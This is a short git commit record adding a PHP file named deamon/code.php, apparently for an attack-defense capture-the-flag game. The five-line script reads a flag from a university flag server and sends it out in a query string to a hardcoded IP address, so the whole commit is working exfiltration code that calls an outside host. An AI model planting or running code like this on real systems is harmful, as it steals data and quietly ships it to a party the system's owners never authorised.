f78bc52fd64ef7c413e1d3531dbd8beccfeed860
WangYihang <wangyihanger@gmail.com>
2017-10-20 05:09:00 -0400

    [+] Daemon

---
+++ deamon/code.php
@@ -0,0 +1,5 @@
+/*<?php*/
+$server_host = "192.168.187.128";
+$server_port = 80;
+$flag = file_get_contents("http://flagserver.xidian.edu.cn/");
+file_get_contents("http://${server_host}:${server_port}/?myheart=${flag}");
